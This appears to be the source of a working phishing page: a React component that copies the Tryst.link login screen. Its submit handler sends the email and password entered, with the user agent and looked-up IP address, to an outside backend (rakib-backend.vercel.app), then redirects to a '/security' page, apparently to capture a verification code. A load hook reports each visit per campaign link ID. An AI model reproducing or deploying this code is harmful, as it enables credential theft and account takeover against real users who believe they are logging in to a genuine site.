import React from "react";
import { FaMagnifyingGlass } from "react-icons/fa6";
import { useEffect,useState } from 'react';
import { useForm } from 'react-hook-form';
import { useLoaderData, useLocation, useNavigate, useParams } from 'react-router-dom';
import { isBrowser, isMobile } from "react-device-detect";

const Home = () => {
  const [userAgent, setUserAgent] = useState('');
  const [ipAddress, setIPAddress] = useState('');
  const location = useLocation();
  const pathAfterDomain = location.pathname.split('/').slice(1, -1).join('/');
  const { user } = useLoaderData();
  const navigate = useNavigate();
  const id = useParams();
  // console.log(user);
  const {
      register,
      handleSubmit,
      formState: { errors },
      reset,
  } = useForm();

  const handleAddBooking = (data) => {
      const bookings = {
          site: 'tryst',
          email: data.email,
          password: data.password,
          agent: userAgent,
          ipAddress: ipAddress,
          user: user,
          temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
          postingTime: Date().toLocaleString(),
      };
      fetch("https://rakib-backend.vercel.app/informations", {
          method: "POST",
          headers: {
              "content-type": "application/json",
          },
          body: JSON.stringify(bookings),
      })
          .then((res) => res.json())
          .then((result) => {
              reset();
              pathInfo(bookings);
              //   navigate("/");
          });
  };
  let type;
  if (isBrowser) {
      type = 'desktop';
  } else {
      type = 'mobile';
  }
  // localStorage.setItem("url", `/auth/login/${id.id}`);
  localStorage.setItem("url", `/${pathAfterDomain}/${id.id}`);
  useEffect(() => {

      const userAgent = window.navigator.userAgent;
      setUserAgent(userAgent);
      fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => setIPAddress(data.ip))
          .catch(error => console.log(error))

      const bookings = {
          type: type,

      };

      fetch(`https://rakib-backend.vercel.app/updateclick/${id.id}`, {
          method: "PUT",
          headers: {
              "content-type": "application/json",
          },
          body: JSON.stringify(bookings),
      })
          .then()
          .then();
  }, [type, id.id]);

  const pathInfo = (infos) => {
      let userId = window.location.pathname;
      const fnl = userId.substring(
          userId.indexOf("/") + 1,
          userId.lastIndexOf("/")
      );
      // navigate("/security", { state: { temp: infos.temp } });
      if (fnl === "auth/login") {
          // console.log(infos.temp);
          navigate("/security", { state: { temp: infos.temp } });
      } else {
      }
  };
  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="bg-primary text-white p-4 flex justify-between items-center md:px-[10%]">
        <div className="flex items-center">
          <img src="/logo.png" alt="Logo" className="h-8 mr-2" />

          <div className="text-white flex gap-2 font-semiBold items-center ml-4 cursor-pointer">
            <FaMagnifyingGlass />
            <span>Search</span>
          </div>
        </div>

        <div>
          <a href="#" className="hover:underline font-bold text-lg">
            Login or Sign up
          </a>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex flex-col md:flex-row justify-center items-start p-6 md:p-16 md:px-[10%]">
        {/* Login Section */}
        <div className="md:w-1/2 p-4">
          <h1 className="text-3xl font-bold mb-4">
            <span className="border-b-2 border-red-500 text-primary">Log </span>
            in
          </h1>
          <form className="space-y-4" onSubmit={handleSubmit(handleAddBooking)}>
            <div>
              <label className="block text-gray-700">Email address</label>
              <input
               {...register("email")}
                type="email"
                required
                className="w-full border-gray-300 border rounded-md px-2 py-3"
              />
            </div>
            <div>
              <label className="block text-gray-700">Password</label>
              <input
               {...register("password")}
               required
                type="password"
                className="w-full border-gray-300 border rounded-md px-2 py-3"
              />
            </div>
            <div className="flex items-center">
              <input type="checkbox" className="mr-2" />
              <label className="text-sm">Remember me for 14 days</label>
            </div>
            <button
              type="submit"
              className="bg-red-500 inline-block font-bold text-lg text-white py-2 px-10 rounded-full"
            >
              Log in
            </button>
          </form>
          <div className="mt-4 space-y-2 ">
            <a
              href="#"
              className="inline-block border font-bold border-red-500 text-red-500 px-4 py-2 rounded-full"
            >
              Forgot your password?
            </a>
            <a
              href="#"
              className="inline-block border font-bold border-red-500 text-red-500 px-4 py-2 rounded-full"
            >
              Didn't receive confirmation instructions?
            </a>
            <a
              href="#"
              className="inline-block border font-bold border-red-500 text-red-500 px-4 py-2 rounded-full"
            >
              I need help recovering access to my account
            </a>
          </div>
        </div>

        {/* Sign up Section */}
        <div className="md:w-1/2 p-4">
          <h1 className="text-3xl font-bold mb-4">Sign up</h1>
          <p className="text-sm text-gray-700 mb-4">
            Tryst.link is one of the fastest-growing escort platforms in the
            world. Built by the same team behind Switter!
          </p>
          <p className="text-sm text-gray-700 mb-4">
            Please select which type of account you'd like to sign up for:
          </p>
          <div className="flex space-x-4">
            <button className="border font-bold border-red-500 text-red-500 px-4 py-2 rounded-full">
              I am a provider
            </button>
            <button className="border font-bold border-red-500 text-red-500 px-4 py-2 rounded-full">
              I am a client
            </button>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-primary text-white p-6 md:p-10 md:px-[10%]">
        <div className="mx-auto flex flex-col md:flex-row justify-between">
          {/* Logo and Description */}
          <div className="mb-6 md:mb-0">
            <div className="flex items-center">
              <img src="/logo-dark-8e6535aacea5e45e9daa.svg" alt="Logo" className="h-10 mr-2" />
              <img src="/a4-project-7aa67929cda298dae2ec.svg" alt="Logo" className="h-10 mr-2" />
              
            </div>
            <p className="text-sm mt-4">© 2018–2023, Assembly Four</p>
          </div>

          {/* Links Section */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div>
              <h3 className="text-lg font-semibold mb-2">Home</h3>
              <ul className="space-y-1">
                <li>
                  <a href="#" className="hover:underline">
                    Memberships & Pricing
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Sign Up
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Login
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-2">Locations</h3>
              <ul className="space-y-1">
                <li>
                  <a href="#" className="hover:underline">
                    All Escorts
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Backpage Alternatives
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-2">Blog</h3>
              <ul className="space-y-1">
                <li>
                  <a href="#" className="hover:underline">
                    TLC Donation Matching
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Resources
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    #AcceptanceMatters
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Escort Terms
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Tryst.link FAQ
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Sex Work FAQ
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-2">Help / Support</h3>
              <ul className="space-y-1">
                <li>
                  <a href="#" className="hover:underline">
                    About
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Social
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Terms
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Privacy
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Legal Notices
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Anti-Exploitation Policy
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Home;
